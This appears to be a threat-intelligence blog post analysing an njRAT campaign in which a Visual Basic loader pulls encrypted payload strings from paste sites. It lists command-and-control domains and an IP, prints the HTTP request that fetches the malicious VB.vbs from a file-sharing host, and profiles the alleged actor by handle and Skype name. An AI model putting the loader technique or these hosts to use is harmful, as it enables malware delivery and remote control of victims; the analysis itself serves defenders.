@@ -1,0 +1,49 @@
+Stringing Victims Along: Leveraging Paste Sites to Bypass Security Controls
+By Levi Gundert on May 24, 2017
+Jan Sparud, PhD also contributed to this analysis.
+
+A recent hunting excursion for obfuscated strings in Recorded Future led to a malware example that highlights the cleverness of adversaries and the channels they choose to attempt remote infection. The malware campaign is a tale of commodity criminal code and strings stored in the cloud for hiding a file’s nature and purpose.
+The following narrative identifies and dissects a specific adversary’s tools and tactics to assist in thinking through current security control efficacy and future risk to a business. 
+On February 13, 2017, Recorded Future observed a Visual Basic program posted in Pastebin — pastebin[.]com/vHuaWqqj (always cached in Recorded Future) — that is a useful example for several reasons. 
+
+Hunting obfuscated strings in paste sites.
+The Visual Basic program: 
+The string fetched from Hastebin (the string appears in the appendix; the page has since been deleted) is decrypted three different times in the bindings of the variables: Load, EntryPoint, and invoke. In all three cases the encrypted string is the name of the variable. 
+
+Fully decrypting the string (see Appendix for the Recorded Future Python script), produces a binary file that ends with XPADDINGXPADDING. The file is classified by ReversingLabs as njRAT with the following meta data:
+ReversingLabs’s runtime analysis of the njRAT sample produces DNS traffic to wwwgooglecom.sytes[.]net and genesis96[.]no-ip.biz. A Recorded Future search for wwwgooglecom.sytes[.]net reveals an additional njRAT sample (found here) that produces DNS traffic to the same wwwgooglecom.sytes[.]net domain.
+The Recorded Future Intel Card for genesis96.no-ip[.]biz returns three A record IP addresses from FarSight Security’s passive DNS (pDNS).
+The records begin in 2010, and include:
+
+Farsight Security results in the Recorded Future Intel Card for genesis96.no-ip[.]biz.
+Historical DNS A record IP addresses for wwwgooglecom[.]sytes[.]net are almost universally owned by Brasil Telecom.
+Using Recorded Future’s API to enrich the list of historical DNS A record IP addresses quickly produces additional leads.
+
+Quickly enriching a list of IP addresses for additional context.
+The first result is for 177.2.158.50. The IP appears in a deleted paste that may identify the actor’s (“leo”) workstation. The author is wzLeonardo, the same author of the original Visual Basic script.
+
+A Recorded Future search for wzLeonardo produces an Intel Card for wzleonardo258.no-ip[.]org. The first reference to the domain originates from Payload Security’s hybrid-analysis.com, for a portable executable file.
+
+Source: Payload Security
+It appears the malicious file is masquerading as a Clash of Clans (a popular online game) bot based on the file name and icon. According to Hybrid Analysis, the file invokes wscript.exe to run the Visual Basic script located at %TEMP%\VB.vbs as dwm.exe, and adds a local firewall rule via netsh.exe to allow dwm.exe to run with a new process ID.
+The Visual Basic script is fetched from a Hungarian file sharing site, ddl3.data[.]hu. Specifically, an HTTP GET request:
+GET /get/0/9952995/VB.vbs.vbs HTTP/1.1 Host: ddl3.data.hu Connection: Keep-Alive
+After successfully executing the Visual Basic script, the rogue dwm.exe process initiates a TCP connection to the host at wzleonardo258.no-ip[.]org on port 2222.
+
+The Recorded Future wzleonardo258.no-ip[.]org Intel Card contains Farsight Security extension results including 63 DNS A record changes in 2016 (the IP address list is included in the IOC section). The ReversingLabs extension contains four additional samples that also initiate traffic to wzleonardo258.no-ip[.]org. Additionally, ReversingLabs has 278 malware samples that initiate traffic to ddl3.data[.]hu.
+
+wzleonardo258.no-ip[.]org results via ReversingLabs Intel Card extension.
+The most recent paste result for wzLeonardo includes a YouTube link where the actor demonstrates a process for “crypting” a RAT to bypass anti-virus software on victim systems. The actor (Leo) appears to be motivated by profit, and the actor’s Skype profile lists Brazil for the location. Leo may be Tunisian based on clues in the YouTube video, and the A record IP addresses resolving to genesis96.no-ip[.]biz in 2010.
+
+Recorded Future analyst view of wzLeonardo’s paste activity.
+
+Recorded Future cached paste includes the Skype moniker “el30n4d0.”
+Creating lists of Visual Basic constructs such as a variable declaration in combination with references invoking obfuscation and/or encryption is a useful Recorded Future hunting methodology for identifying malicious Visual Basic programs.
+(Dim [previously referred to “dimension of an array,” but currently equates to declaring a variable] is difficult to avoid in Visual Basic).
+
+Timeline of hunting obfuscated/encrypted strings.
+The actor self-named Leo is a specific example of a criminal exploiting cloud services and native Windows tools for fun and assumed profit. Leo’s tactic is writing Visual Basic code to fetch additional binaries in the form of encrypted strings from file/paste sharing sites and executing those strings (binaries) via Windows tools like wscript.exe and cmd.exe. 
+Leo represents a trend moving away from fetching binaries on victim machines in native (e.g., .exe) or compressed (e.g., .zip or .rar) form. The relatively new technique involves storing and retrieving malicious code in obfuscated and/or encrypted strings. This puts defensive emphasis on the endpoint and the need for granular visibility into native Windows tools and memory. 
+In this case services like Pastebin, Hastebin, and Data.hu were used, but popular public cloud providers like Google, Microsoft, Amazon, Alibaba, etc. are also favorites which renders defensive domain whitelisting less effective.  
+Strategic threat intelligence gained from actors like Leo creates opportunities for improved risk scores and estimated future financial loss, triggering derivative opportunities to assess current controls and requisite spending on additional controls where needed.
+View the full list of IOCs related to this analysis.
